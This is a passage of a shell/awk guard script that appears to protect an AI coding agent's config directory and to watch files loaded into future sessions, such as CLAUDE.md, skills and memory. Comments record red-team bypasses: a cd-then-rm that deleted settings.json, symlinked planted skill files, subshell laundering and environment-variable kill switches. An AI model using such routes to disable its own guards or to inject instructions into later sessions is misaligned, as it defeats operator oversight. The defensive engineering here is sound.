    # design"); what is protected is the dir ITSELF and its teeth, so the dir is
    # passed exact and bin/ and hooks/ are passed as subtrees.
    # A LEADING `%` MEANS "MATCH THIS ERE", which is how a PINNED FILE inside a
    # writable directory is named without matching the directory (FLOOR.md
    # EDGE-cdbridge-01, reproduced 2026-08-30: `cd ~ && rm .claude/settings.json`
    # exited 0). This is the fix the record itself prescribes, and the reason the
    # obvious alternative is wrong: widening the config dir to a subtree closes
    # this too and costs `cd ~/.claude/MEMORY && rm stale-note.md`, which S7 has
    # asserted since pass 7. Surface regex, not subtree.
    #
    # NO APOSTROPHES BELOW THIS LINE, and none above it either. The whole awk
    # program is one single-quoted shell word, so one apostrophe in a comment
    # ends it early and the file stops parsing as shell — harbor#299 is the same
    # defect in the statusline jq program, and writing this comment reproduced
    # it. `sh -n` catches it; nothing else does.
    #
    # The pattern arrives on an INPUT LINE, so awk does no escape processing on
    # it and a `\.` in the surface list stays a literal dot — the same reason
    # VERB and the directories are passed this way rather than through -v.
    function inside(p,   i, d) {
      if (p == "") return 0
      for (i = 1; i <= nd; i++) {
        d = D[i]
        if (substr(d, 1, 1) == "=") { if (p == substr(d, 2)) return 1; continue }
        if (substr(d, 1, 1) == "%") { if (p ~ substr(d, 2)) return 1; continue }
        if (p == d || index(p, d "/") == 1) return 1
      }
      return 0
    }
    /^MODE:/ { mode = substr($0, 6); next }
    /^VERB:/ { verb = substr($0, 6); next }
    /^CFGD:/ { d = substr($0, 6)
               # Trailing slashes are noise on a DIRECTORY and meaningful inside
               # a pattern, so only directories are stripped.
               if (substr(d, 1, 1) != "%") sub(/\/+$/, "", d)
               if (d != "") D[++nd] = d; next }
    /^SEGC:/ { n = $0; sub(/^SEGC:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGC:[0-9]+:/, "", v)
               C[n + 0] = v; if (n + 0 > MAX) MAX = n + 0; next }
    /^SEGA:/ { n = $0; sub(/^SEGA:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGA:[0-9]+:/, "", v)
               A[n + 0] = A[n + 0] "\n" v; if (n + 0 > MAX) MAX = n + 0; next }
    END {
      if (nd == 0 || verb == "") exit 1
      cwd = ""
      for (k = 1; k <= MAX; k++) {
        w = C[k]; if (w == "") continue
        base = w; sub(/.*\//, "", base)
        if (base == "popd") { cwd = ""; continue }
        if (base == "cd" || base == "pushd") {
          t = ""; got = 0
          m = split(A[k], ar, "\n")
          for (j = 1; j <= m; j++) {
            if (ar[j] == "" || ar[j] == "--") continue
            if (ar[j] ~ /^-[LPen@]+$/) continue
            t = ar[j]; got = 1; break
          }
          if (!got)                                cwd = (base == "cd") ? home : ""
          else if (t == "-" || t ~ /^[-+][0-9]+$/) cwd = ""
          else                                     cwd = resolve(t, cwd)
          continue
        }
        # A MUTATING SEGMENT. Its operands are judged where the command is
        # standing NOW — the fold above has already run for every earlier hop.
        if (w !~ verb) continue
        m = split(A[k], ar, "\n")
        # In last mode only the FINAL operand is judged. Collected first so a
        # trailing flag cannot be mistaken for the destination.
        last = ""
        for (j = 1; j <= m; j++) {
          if (ar[j] == "" || ar[j] == "--") continue
          # Flags are not operands. "rm -rf" must not resolve `-rf` as a name.
          if (substr(ar[j], 1, 1) == "-") continue
          if (mode == "last") { last = ar[j]; continue }
          if (inside(resolve(ar[j], cwd))) exit 0
        }
        if (mode == "last" && last != "" && inside(resolve(last, cwd))) exit 0
      }
      exit 1
    }'
}

# floor_seg_cd_fold <dir>… [+<subtree>…] — harbor#776. Each segment whose RELATIVE operand or redirect
# target lands at or below <dir> after the cd/pushd chain, re-spelled with it resolved: a
# `FOLD:<flat line>` plus SEGC/SEGA/SEGR rows under a fresh id, for guard-bash to append.
# Standing INSIDE <dir> stays the cd-cfg rules' (harbor#280/#289); from there only a +<subtree> folds.
# STICKY: every dir the command stood in stays a candidate, since the table carries no subshell
# structure (`(cd /tmp)`, `$(cd /tmp)`, a pipeline, a sibling `bash -c` would launder the fold).
# UNRESOLVABLE IS NOT SAFE: after `cd -`, popd, a substitution, an untracked variable, a glob, a
# climb out of the unknown session cwd or a 65th dir, a target that reaches <dir> from one of its
# ancestors (`.claude/…`, `<user>/.claude/…`, `../` first) is folded onto <dir>.
floor_seg_cd_fold() { # <dir>… [+<subtree>…] -> FOLD: lines and SEG rows
  [ -n "${FLOOR_SEGS:-}" ] || return 0
  [ "$#" -gt 0 ] || return 0
  case "$FLOOR_SEGS" in *cd*|*pushd*|*popd*) ;; *) return 0 ;; esac
  { printf 'CFGD:%s\n' "$@"; printf '%s\n' "$FLOOR_SEGS"; } | awk -v home="$HOME" '
    # NO APOSTROPHES in this program: it is one single-quoted shell word (harbor#299).
    function norm(p,   n, i, a, out, k, lead, r) {
      lead = (substr(p, 1, 1) == "/")
      n = split(p, a, "/"); k = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (k > 0) k--; continue }
        out[++k] = a[i]
      }
      r = ""
      for (i = 1; i <= k; i++) r = r ((i == 1 && !lead) ? "" : "/") out[i]
      if (r == "") r = lead ? "/" : ""
      return r
    }
    function climbs(p,   n, i, a, d) {
      n = split(p, a, "/"); d = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (--d < 0) return 1; continue }
        d++
      }
      return 0
    }
    function inD(p, ci,   i, q, d) {
      q = ci ? tolower(p) : p
      for (i = 1; i <= nd; i++) { d = ci ? LD[i] : D[i]; if (q == d || index(q, d "/") == 1) return 1 }
      return (q ~ /^~[A-Za-z_][A-Za-z0-9_.-]*\/\.claude(\/|$)/)
    }
    function inS(p,   i, q) { q = tolower(p); for (i = 1; i <= nsd; i++) if (q == LSD[i] || index(q, LSD[i] "/") == 1) return 1; return 0 }
    # Landing folds case, as APFS and the flat rules do; the cwd handed to the cd-cfg rules is theirs only
    # when THEIR case-strict fold would see it, so `cd ~ && cd .CLAUDE` still folds here.
    function lands(c, r) { return inS(r) || (inD(r, 1) && !(inD(c, 0) && !inS(c))) }
    # An ancestor of <dir> or a dir below it: the only candidates a non-climbing target can use.
    function near(p,   i, q) {
      if (p == "/" || substr(p, 1, 1) == "~") return 1
      q = tolower(p)
      for (i = 1; i <= nd; i++) if (index(LD[i] "/", q "/") == 1 || index(q, LD[i] "/") == 1) return 1
      for (i = 1; i <= nsd; i++) if (index(LSD[i] "/", q "/") == 1 || index(q, LSD[i] "/") == 1) return 1
      return 0
    }
    function addc(p) {
      if (p == "" || (p in HAS)) return
      if (nc >= 64) { dirty = 1; return }
      HAS[p] = 1; CL[++nc] = p; NEAR[nc] = near(p)
    }
    function addvar(a,   n) { n = a; sub(/=.*/, "", n); VN[n]++; V[n, VN[n]] = substr(a, length(n) + 2) }
    # A reassigned HOME makes every home spelling a guess, so it dirties the fold as well.
    function cdto(t, depth,   i, m, name, rest) {
      if (t == "~" || t == "$HOME" || t == "${HOME}") { addc(home); if (homeset) dirty = 1; return }
      if (substr(t, 1, 2) == "~/")       { addc(norm(home substr(t, 2))); if (homeset) dirty = 1; return }
      if (substr(t, 1, 6) == "$HOME/")   { addc(norm(home substr(t, 6))); if (homeset) dirty = 1; return }
      if (substr(t, 1, 8) == "${HOME}/") { addc(norm(home substr(t, 8))); if (homeset) dirty = 1; return }
      if (depth == 0 && match(t, /^[$]([{][A-Za-z_][A-Za-z0-9_]*[}]|[A-Za-z_][A-Za-z0-9_]*)/)) {
        name = substr(t, 2, RLENGTH - 1); gsub(/[{}]/, "", name); rest = substr(t, RLENGTH + 1)
        if ((rest != "" && substr(rest, 1, 1) != "/") || !(name in VN)) { dirty = 1; return }
        for (i = 1; i <= VN[name]; i++) cdto(V[name, i] rest, 1)
        return
      }
      if (t ~ /[$`*?[]/ || index(t, "@SUB@") || index(t, "@PSUB@")) { dirty = 1; return }
      if (substr(t, 1, 1) == "/" || t ~ /^~[A-Za-z_][A-Za-z0-9_.-]*(\/|$)/) { addc(norm(t)); return }
      if (substr(t, 1, 1) == "~") { dirty = 1; return }
      if (climbs(t)) dirty = 1
      m = nc
      for (i = 1; i <= m; i++) addc(norm(CL[i] "/" t))
    }
    # The resolved spelling of one operand, or "" when it does not land at or below <dir>.
    function tokfold(t, op,   pre, p, i, r, s, cl, c1, q) {
      if (op == "<<" || op == "<<<") return ""
      pre = ""; p = t
      if (substr(p, 1, 1) == "-") {
        i = index(p, "="); if (!i) return ""
        pre = substr(p, 1, i); p = substr(p, i + 1)
      } else if (match(p, /^[A-Za-z_][A-Za-z0-9_]*=/)) {
        pre = substr(p, 1, RLENGTH); p = substr(p, RLENGTH + 1)
      }
      if (p == "" || p == "-" || p ~ /[[:space:]]/) return ""
      c1 = substr(p, 1, 1)
      if (c1 == "/" || c1 == "~" || c1 == "&" || c1 == "$" || c1 == "@" || c1 == "`") return ""
      # A later unknown component is one word only when no `..` can climb back over it.
      if ((p ~ /[$`]/ || index(p, "@SUB@") || index(p, "@PSUB@")) && p ~ /(^|\/)\.\.(\/|$)/) return ""
      cl = climbs(p)
      for (i = 1; i <= nc && work < 8000; i++) {
        if (!cl && !NEAR[i]) continue
        work++; r = norm(CL[i] "/" p)
        if (lands(CL[i], r)) return pre r
      }
      if (work >= 8000) dirty = 1   # a budget that runs out fails CLOSED, into the dirty arm
      if (dirty) {
        s = norm(p); q = tolower(s)
        for (i = 1; i <= ns; i++) if (q == LSS[i] || index(q, LSS[i] "/") == 1) return pre norm(SA[i] "/" s)
      }
      return ""
    }
    function flat(s,   x) { x = s; gsub(/[[:space:];&|<>()`]/, "_", x); return x }
    /^CFGD:/ { d = substr($0, 6); sub(/\/+$/, "", d); if (d == "") d = "/"
               if (substr(d, 1, 1) == "+") { SD[++nsd] = substr(d, 2); LSD[nsd] = tolower(SD[nsd]) }
               else { D[++nd] = d; LD[nd] = tolower(d) }
               next }
    /^SEG[CWAR]:/ {
      tg = substr($0, 4, 1); s = substr($0, 6); id = s; sub(/:.*/, "", id); id = id + 0
      v = s; sub(/^[0-9]+:/, "", v)
      if (id > MAX) MAX = id
      if (v ~ /^HOME=/) homeset = 1
      if (tg == "C") C[id] = v
      else if (tg == "W") W[id] = v
      else if (tg == "A") A[id, ++AN[id]] = v
      # RX, never RT: gawk reserves RT and dies on it as an array (harbor#865)
      else { o = v; sub(/:.*/, "", o); t = v; sub(/^[^:]*:/, "", t); RO[id, ++RN[id]] = o; RX[id, RN[id]] = t }
      next
    }
    END {
      if (nd == 0) exit 0
      home = norm(home)
      for (i = 1; i <= nd; i++) {
        if (substr(D[i], 1, 1) != "/") continue
        n = split(D[i], P, "/")
        for (j = 2; j <= n; j++) {
          a = ""; for (q = 2; q < j; q++) a = a "/" P[q]
          if (a == "") a = "/"
          sfx = P[j]; for (q = j + 1; q <= n; q++) sfx = sfx "/" P[q]
          if (sfx != "") { SA[++ns] = a; SS[ns] = sfx; LSS[ns] = tolower(sfx) }
        }
      }
      for (k = 1; k <= MAX; k++) {
        b = C[k]; sub(/.*\//, "", b)
        if (C[k] == "" && W[k] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) addvar(W[k])
        else if (b ~ /^(export|declare|typeset|local|readonly)$/)
          for (j = 1; j <= AN[k]; j++) if (A[k, j] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) addvar(A[k, j])
      }
      for (k = 1; k <= MAX; k++) {
        w = C[k]; b = w; sub(/.*\//, "", b)
        if (b == "popd") { dirty = 1; continue }
        if (b == "cd" || b == "pushd") {
          tt = ""; got = 0
          for (j = 1; j <= AN[k]; j++) {
            if (A[k, j] == "--" || A[k, j] ~ /^-[LPenqs@]+$/) continue
            tt = A[k, j]; got = 1; break
          }
          if (!got) { if (b == "cd") cdto("~", 0); else dirty = 1 }
          else if (tt == "-" || tt ~ /^[-+][0-9]+$/) dirty = 1
          else cdto(tt, 0)
          continue
        }
        if (nc == 0 && !dirty) continue
        if (w == "" && !RN[k]) continue
        hit = 0
        for (j = 1; j <= AN[k]; j++) { r = tokfold(A[k, j], ""); NA[j] = (r != "") ? r : A[k, j]; if (r != "") hit = 1 }
        for (j = 1; j <= RN[k]; j++) { r = tokfold(RX[k, j], RO[k, j]); NT[j] = (r != "") ? r : RX[k, j]; if (r != "") hit = 1 }
        if (!hit) continue
        id = MAX + (++out)
        line = (w != "") ? flat(w) : ""
        for (j = 1; j <= AN[k]; j++) line = line " " flat(NA[j])
        for (j = 1; j <= RN[k]; j++) if (RO[k, j] != "<<" && RO[k, j] != "<<<") line = line " " RO[k, j] " " flat(NT[j])
        print "FOLD:" line
        if (w != "") print "SEGC:" id ":" w
        for (j = 1; j <= AN[k]; j++) print "SEGA:" id ":" NA[j]
        for (j = 1; j <= RN[k]; j++) print "SEGR:" id ":" RO[k, j] ":" NT[j]
      }
    }' 2>/dev/null
}

# ─────────────────────────────────────────────────────────────────────────────
# B8 (harbor#38) — the PERSISTENT INSTRUCTION surfaces.
# ~/.claude/CLAUDE.md and the agents/skills/commands trees are loaded into every
# FUTURE session. Writing to them is capability injection with a session's
# delay, and all four were unwatched: guard-selfedit protects only the floor's
# own teeth, and B6 hashed settings.json, not these.
#
# They stay WRITABLE by design (upstream's "you may edit ~/.claude freely"
# stance, which the owner kept). What changes is that a change is no longer
# SILENT: it is pinned here and reported at the next SessionStart — which is
# exactly when injected instructions would first be loaded.
# NOT settable from the environment. `FLOOR_INSTR_SURFACES=' '` made the whole
# check a silent no-op, which is the same undocumented-kill-switch class as
# FLOOR_AWK/FLOOR_GREP (privsec FO-03/04/05, re-found as B8-04). A project-level
# settings.json `env` block can set variables, so an overridable watch list is
# an off switch the operator never agreed to.
# `hooks` and `plugins` are here as well as under B2/B6: plugins ship hooks and
# skills, and both are loaded, not merely read.
#
# `projects/*/memory` is the auto-memory injected into every session — the
# highest-value injection target in the tree. It was pulled from this list once,
# on the assumption that the model rewrites it often enough to make the advisory
# constant noise; the assumption was MEASURED AND WRONG (red-team B8-NOISE-06,
# refuted): across 16 session transcripts, 3 (19%) touched the memory dir, and
# MEMORY.md went untouched through a full day of heavy sessions. A standing
# advisory until re-pin is the same posture every other surface here has, and
# each memory write is exactly the model-authored, loaded-into-every-session
# content this check exists to surface.
#
# `inject.d` (harbor#173) IS AN INSTRUCTION SURFACE AND WAS ALMOST SHIPPED
# UNWATCHED. A rule pack is a markdown file whose body is injected verbatim into
# a session's context at the moment of a tool call — text loaded into every
# FUTURE session that nothing else here reports. It is arguably the sharpest
# surface on the list: a pack arrives at the instant of an action rather than in
# a prefix a reader may skim, which is measurably why it works (EVALS.md E6, E10)
# and exactly why an unreviewed edit to one matters MORE than an unreviewed edit
# to CLAUDE.md. Caught by checking, on the same branch that built it.
# `context-rules` is the same surface after harbor#1010; inject.d stays while the engine reads it.
FLOOR_INSTR_SURFACES='CLAUDE.md CLAUDE.local.md agents skills commands output-styles hooks plugins context-rules inject.d projects/*/memory'

# floor_sha — one sha256, whichever tool this box has.
floor_sha() { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi | awk '{print $1}'; }

# floor_pluginmeta_sha <json-file> — hash a TIMESTAMP-STRIPPED canonical form of a
# plugin manifest (harbor#198). The plugin system rewrites `lastUpdated` /
# `installedAt` in installed_plugins.json and known_marketplaces.json on every
# session, so hashing raw bytes made B8 report the same paths as drift at EVERY
# SessionStart and re-pinning could never stick — §2.11 in its literal form. The
# canonical form keeps the plugin set, every gitCommitSha and every installPath,
# so an added or repointed plugin is STILL drift; only the clock is ignored.
# jq missing OR the file not parsing as JSON → hash the RAW bytes, so a manifest
# we cannot normalize is still WATCHED (fail toward more coverage, never less).
#
# `|| true` INSIDE THE SUBSTITUTION, AND IT IS LOAD-BEARING. The pinner runs under
# `set -eu` (pin-instructions.sh:31), and an assignment whose command substitution
# exits non-zero aborts the subshell the substitution runs in — so on a manifest jq
# CANNOT PARSE, the whole function evaporated and `printf '%s  %s'` emitted a line
# with an EMPTY hash and the path intact. That is worse than the churn it was built
# to fix and the exact inversion of the sentence above: the file looked watched, its
# hash was the empty string every time, and any subsequent edit to it was invisible
# forever. Found 2026-08-18 by the malformed-catalog case in floor-test §9h, which
# was written for the sibling function below and failed here first. The fallback was
# always the DESIGN; under `set -e` it was unreachable code.
floor_pluginmeta_sha() { # <json-file>
  if command -v jq >/dev/null 2>&1; then
    _pmn="$(jq -S 'walk(if type=="object" then del(.lastUpdated, .installedAt) else . end)' "$1" 2>/dev/null || true)"
    if [ -n "$_pmn" ]; then printf '%s' "$_pmn" | floor_sha; return; fi
  fi
  floor_sha < "$1"
}

# floor_syncmeta_sha <json-file> — hash plugins/synced/<id>/.marketplaces.json without `etag` and each
# row's `updated_at`: the account sync rewrites both about hourly with the list unchanged, which kept B8
# amber at every SessionStart. Name, source, scope and id stay hashed, so a new marketplace is drift.
floor_syncmeta_sha() { # <json-file>
  if command -v jq >/dev/null 2>&1; then
    _smn="$(jq -S 'del(.etag) | (.rows | arrays) |= map((. | objects) |= del(.updated_at))' "$1" 2>/dev/null || true)"
    if [ -n "$_smn" ]; then printf '%s' "$_smn" | floor_sha; return; fi
  fi
  floor_sha < "$1"
}

# floor_marketplace_sha <json-file> — hash a marketplace CATALOG with the per-entry
# `source.sha` stripped. Same failure as harbor#198, different file and a field that
# is not a clock, so it needs its own justification rather than an extra `del()` in
# the function above.
#
# MEASURED 2026-08-18 against anthropics/claude-plugins-official, the marketplace
# this box actually tracks: 17 commits touched `.claude-plugin/marketplace.json` on
# 2026-08-18 alone, 13 on 2026-08-17, and a 100-commit page for that single path did
# not reach its end. EVERY ONE is `bump(<plugin>): <oldsha> → <newsha>`, and the diff
# is ONE line — `.plugins[].source.sha`. So the raw bytes of this file change several
# times a day, B8 goes red several times a day, and the operator is invited to bless
# a 286-entry vendor catalog they cannot diff (the marketplace is not a git checkout
# locally, so there is no previous copy to compare against). That is §2.11 arriving
# on a schedule Anthropic controls: measured on this box 2026-08-18, the pin went red
# 66 seconds after a clean `pin-instructions --apply`.
#
# WHY THIS IS NOT A WEAKENED GATE — the argument has to be that the stripped field
# cannot carry an instruction into a session, not merely that it is noisy:
#   · `url`, `path` and `ref` STAY hashed. Repointing an entry at an attacker's repo
#     is the actual supply-chain attack, and it still reads as drift (validated: a
#     one-entry url change moves this hash; a sha bump does not).
#   · Everything INSTALLED keeps its own pinned sha. installed_plugins.json carries
#     `gitCommitSha` per installed plugin and floor_pluginmeta_sha deliberately
#     preserves it — 4 entries on this box, verified 2026-08-18.
#   · A catalog sha is a FORECAST, not a load. When that sha is actually fetched the
#     plugin's own files land under `plugins/` and are hashed file-by-file, so the
#     content change is caught at the moment it can reach a session — which is later
#     than the catalog edit and strictly more informative than it.
# 233 of 286 entries carry an object `source`; the other 53 are plain strings and are
# untouched by the projection. Every marketplace.json is RE-EMITTED below rather than
# dropped, so the file stays in the manifest and an entry added, removed or repointed
# is still drift — only the upstream sha treadmill is ignored.
# jq missing OR the file not parsing as JSON → hash the RAW bytes, so a catalog we
# cannot normalize is still WATCHED (fail toward more coverage, never less). The
# `|| true` is what makes that reachable under the pinner's `set -eu` — see the note
# on floor_pluginmeta_sha above, where the same one-token omission had been silently
# emitting an empty hash for any manifest jq could not parse.
floor_marketplace_sha() { # <json-file>
  if command -v jq >/dev/null 2>&1; then
    _mkn="$(jq -S '(.plugins | arrays) |= map((.source | objects) |= del(.sha))' "$1" 2>/dev/null || true)"
    if [ -n "$_mkn" ]; then printf '%s' "$_mkn" | floor_sha; return; fi
  fi
  floor_sha < "$1"
}

# ── the plugins the harness LOADS (harbor#478) ──────────────────────────────
# A daily byte-identical re-extraction moved cache/<ver>/ and drifted B8, so cache/ is pinned
# per ENTRY of installed_plugins.json, by content; a version dir no entry names loads nothing.
#
# floor_plugins_loaded <json> — "key TAB scope TAB project TAB dir" per entry, `-` when absent
# (tab is IFS whitespace). A shape it cannot read exactly gives a `-` dir: the full walk.
floor_plugins_loaded() {
  jq -r 'if (.plugins | type) != "object" or any(.plugins[]; type != "array" or any(.[]; type != "object"))
         then "?\t-\t-\t-" else
           .plugins | to_entries[] | .key as $k | .value[]
           | [$k, (.scope // "user"), (.projectPath // "-"), (.installPath // "-")] | map(tostring)
           | if any(.[]; . == "" or test("[\t\n\r\\\\]")) then ["?", "-", "-", "-"] else . end | @tsv
         end' "$1" 2>/dev/null || true
}
# floor_installed_sha <installed_plugins.json> — floor_pluginmeta_sha's form, minus the three
# fields a re-extraction rewrites. Only used while the loaded dirs are hashed by content.
floor_installed_sha() {
  _isn="$(jq -S 'walk(if type=="object" then del(.lastUpdated, .installedAt) else . end)
                 | (.plugins | objects) |= map_values(if type=="array"
                     then map(if type=="object" then del(.installPath, .version, .gitCommitSha) else . end)
                     else . end)' "$1" 2>/dev/null || true)"
  if [ -n "$_isn" ]; then printf '%s' "$_isn" | floor_sha; else floor_pluginmeta_sha "$1"; fi
}
# floor_instr_tree <dir> <label> — "<sha>  <label>/<rel>" per file under <dir>, and every
# symlink's target, with the harness's own bookkeeping pruned as in the walk below.
floor_instr_tree() {
  _itd="${1%/}"
  if command -v sha256sum >/dev/null 2>&1; then _ith=sha256sum; else _ith='shasum -a 256'; fi
  # -H: a symlinked installPath is walked through, and its target is recorded too.
  if [ -L "$_itd" ]; then printf 'link:%s  %s\n' "$(readlink "$_itd" 2>/dev/null || echo '?')" "$2"; fi
  # shellcheck disable=SC2086
  find -H "$_itd" \( -name .git -o -name .in_use \) -prune -o \
       ! -name .orphaned_at ! -name .last-complete-round ! -name .gcs-sha \
       -type f -exec $_ith {} + 2>/dev/null \
    | awk -v p="  $_itd/" -v l="  $2/" '{ i = index($0, p); if (i) print substr($0, 1, i - 1) l substr($0, i + length(p)) }'
  find -H "$_itd" \( -name .git -o -name .in_use \) -prune -o -type l -print 2>/dev/null | while IFS= read -r _itl; do
    _itr="$2/${_itl#"$_itd"/}"
    printf 'link:%s  %s\n' "$(readlink "$_itl" 2>/dev/null || echo '?')" "$_itr"
    if [ -f "$_itl" ]; then printf '%s  %s\n' "$(floor_sha < "$_itl")" "$_itr"; fi
  done
  return 0
}

# floor_instr_diff <pin> — the manifest on stdin against the pin file: "< line" pinned only, "> line" now only,
# sorted; nothing when they match. Not `diff - <pin>`: macOS diff opens `-` by name, which the confinement refuses
# (harbor#555), and the error read as drift naming no path. No temp file: a dry run and --check write nothing.
floor_instr_diff() {
  awk -v pin="$1" 'BEGIN { while ((getline l < pin) > 0) p[l] = 1 }
    { n[$0] = 1 } END { for (k in p) if (!(k in n)) print "< " k; for (k in n) if (!(k in p)) print "> " k }' | sort
}

# floor_instr_manifest <config-dir> — "<sha>  <relative-path>" per file, sorted.
# ONE implementation, shared by the pinner and the gate: two hashers that agree
# only by coincidence would report drift on every session or on none.
#
# `-exec … +` batches the hashing. Hashing 597 skill files one spawn at a time
# measured 9.4s; batched it is 0.14s (2026-07-25). A SessionStart hook that
# takes nine seconds is a hook the operator disables, so the batching is a
# correctness property, not a micro-optimisation.
# SYMLINKS ARE THE WHOLE GAME HERE. A plain `find -type f` walk does not match a
# symlink at all, so `ln -s /tmp/evil.md skills/evil.md` was invisible, and a
# top-level `CLAUDE.md` symlinked into a dotfiles repo — an extremely common
# setup — recorded as "absent", blinding the check permanently (red-team B8-02,
# B8-03). Two things are therefore recorded for every tree: the CONTENT reached
# by following links (`find -L`), and the LINK TARGETS themselves, so that
# re-pointing a link is drift even when the new target is byte-identical.
# True when a projects/<x>/memory link only points at another projects/<y>/memory of the same config dir that
# is a real directory: absolute, no `..`, one level, so the walk pins its content under its own path anyway.
floor_instr_shared_memory() { # <config-dir> <surface glob> <link target>
  [ "$2" = 'projects/*/memory' ] || return 1
  case "$3" in "$1"/projects/*/memory) ;; *) return 1 ;; esac
  case "$3" in *..*|*//*) return 1 ;; esac
  _ism="${3#"$1"/projects/}"; _ism="${_ism%/memory}"
  case "$_ism" in ''|*/*) return 1 ;; esac
  [ -d "$3" ] && [ ! -L "$3" ]
}
floor_instr_manifest() { # <config-dir>
  _cfg="${1%/}"
  for _g in $FLOOR_INSTR_SURFACES; do
    # A surface may be a glob (projects/*/memory). Unmatched globs come back
    # literally, which the -f/-d tests below then record as absent.
    for _p in "$_cfg"/$_g; do
      # ${_p#$_cfg/} is a GLOB strip, so a config dir containing [ ? or *
      # silently failed to match and the surface came out as an ABSOLUTE path
      # while the directory branch (awk index) stripped it correctly — the same
      # path spelled two ways in one manifest (pass 10, P10-05). Literal length
      # arithmetic instead.
      _s="$(printf '%s' "$_p" | awk -v n="${#_cfg}" '{print substr($0, n+2)}')"
      if [ -L "$_p" ]; then
        _lt="$(readlink "$_p" 2>/dev/null || echo '?')"
        # A worktree's memory link to a store this same walk already pins adds no instruction: every
        # new worktree turned B6 amber (71 advisories, 2026-10-23..25). Only that exact shape is exempt.
        if floor_instr_shared_memory "$_cfg" "$_g" "$_lt"; then continue; fi
        printf 'link:%s  %s\n' "$_lt" "$_s"
      fi
      if [ -f "$_p" ]; then
        printf '%s  %s\n' "$(floor_sha < "$_p")" "$_s"
      elif [ -d "$_p" ]; then
        # DO NOT follow directory symlinks. `find -L` did, and a link pointing at
        # its own ancestor (`ln -s .. skills/up`) made the walk self-referential:
        # the manifest never settled, so the advisory became permanent and
        # --apply could never clear it (pass 10, B8R2-06). Enumerating without
        # -L terminates; a symlinked FILE is still hashed through the link below,
        # and every link's TARGET is recorded, so re-pointing one is still drift
        # even though its contents are not walked.
        # .git is excluded: a plugin checkout rewrites objects on every fetch,
        # and an advisory that fires on every fetch is one nobody reads.
        #
        # `.in_use/` AND `.last_inuse_sweep` ARE THE SAME CLASS, and they were
        # making the advisory permanent. Claude Code reference-counts each cached
        # plugin by dropping `plugins/cache/<mp>/<plugin>/<ver>/.in_use/<pid>` at
        # session start and sweeping them into `plugins/.last_inuse_sweep`. So
        # EVERY session changed the manifest, and this machine's SessionStart had
        # been reporting the identical five paths as instruction-surface drift —
        # four `.in_use/<pid>` files and the sweep timestamp. Verified 2026-08-02:
        # the two pids present were exactly the two live sessions, and one marker
        # read {"pid":89490,"procStart":"Sun Aug  2 08:41:36 2026"} — a lockfile,
        # not content.
        #
        # THIS NARROWS WHAT B8 WATCHES, so the justification has to be that the
        # pruned paths cannot carry injected instructions, not merely that they
        # are noisy. They cannot: a plugin is loaded from its manifest — skills/,
        # commands/, hooks/, agents/ — and nothing reads `.in_use/`. Pruning is
        # scoped to that one directory name and that one filename rather than to
        # a pattern, so a file planted anywhere else under plugins/ is still
        # hashed. The alternative was worse in the way №2.11 names: an advisory
        # that cries wolf at every single SessionStart is one the operator learns
        # to scroll past, and then the real drift scrolls past with it.
        # .gcs-sha is a git-fetch marker (one sha), pruned like .git. The two
        # plugin manifests are excluded here and re-emitted below in a
        # timestamp-normalized form (harbor#198); their raw bytes churn every
        # session on a lastUpdated field that carries no instruction.
        # marketplace.json is excluded and re-emitted the same way, on the same
        # reasoning applied to a different field — see floor_marketplace_sha for the
        # measured churn rate and why stripping `source.sha` does not narrow what a
        # session can be instructed by. EXCLUDED-THEN-RE-EMITTED, never dropped.
        # harbor#764: the plugin sync's `synced/<id>/.last-complete-round` and the cache's
        # `<ver>/.orphaned_at` are timestamps the harness rewrites on its own, so B8 went amber
        # seconds after every re-pin. Pruned by NAME and on the plugins surface only; on any other
        # surface the two names below are the already-pruned sweep file, a no-op.
        if [ "$_g" = plugins ]; then _bk1=.last-complete-round; _bk2=.orphaned_at; _bk3=.marketplaces.json
        else _bk1=.last_inuse_sweep; _bk2=.last_inuse_sweep; _bk3=.last_inuse_sweep; fi
        # harbor#478: the harness re-extracts a plugin into a new cache/<ver>/ about daily,
        # byte-identical. So cache/ is read only through installed_plugins.json, by the entry
        # that LOADS it, below; jq missing, the file unreadable or an odd config dir → full walk.
        _ld=''; _pc="$_p/.no-prune/."
        if [ "$_g" = plugins ] && [ -f "$_p/installed_plugins.json" ] && command -v jq >/dev/null 2>&1; then
          _ld="$(floor_plugins_loaded "$_p/installed_plugins.json")"
          case "$_p" in *[][*?]*) _ld='' ;; esac
          # No installPath, or two entries one label: what loads is unclear, so walk all of cache/.
          if printf '%s\n' "$_ld" | awk -F'\t' '$4 == "-" || seen[$1 FS $2 FS $3]++ { f = 1 } END { exit !f }'; then _ld=''; fi
          [ -z "$_ld" ] || _pc="$_p/cache"
        fi
        if command -v sha256sum >/dev/null 2>&1; then
          find "$_p" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
               ! -name .last_inuse_sweep ! -name .gcs-sha \
               ! -name installed_plugins.json ! -name known_marketplaces.json \
               ! -name marketplace.json ! -name "$_bk1" ! -name "$_bk2" ! -name "$_bk3" \
               -type f -exec sha256sum {} + 2>/dev/null
        else
          find "$_p" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
               ! -name .last_inuse_sweep ! -name .gcs-sha \
               ! -name installed_plugins.json ! -name known_marketplaces.json \
               ! -name marketplace.json ! -name "$_bk1" ! -name "$_bk2" ! -name "$_bk3" \
               -type f -exec shasum -a 256 {} + 2>/dev/null
        # Prefix-stripped with awk's index(), NOT sed: the config dir is data,
        # and putting it in a sed PATTERN made its metacharacters active — a `|`
        # in the path threw "bad flag in substitute command" and silently
        # dropped the whole surface from the manifest, which then reads as
        # "clean" (red-team B8, B8-DEF-07). index() is a literal search.
        fi | awk -v p="  $_cfg/" '{ i=index($0,p); if (i) print substr($0,1,i+1) substr($0,i+length(p)); else print }'
        # Re-emit the two excluded manifests in timestamp-normalized form. Guarded
        # on -f, so this is a no-op for every surface that does not hold them.
        for _pm in installed_plugins.json known_marketplaces.json; do
          [ -f "$_p/$_pm" ] || continue
          _pmrel="$(printf '%s' "$_p/$_pm" | awk -v n="${#_cfg}" '{print substr($0, n+2)}')"
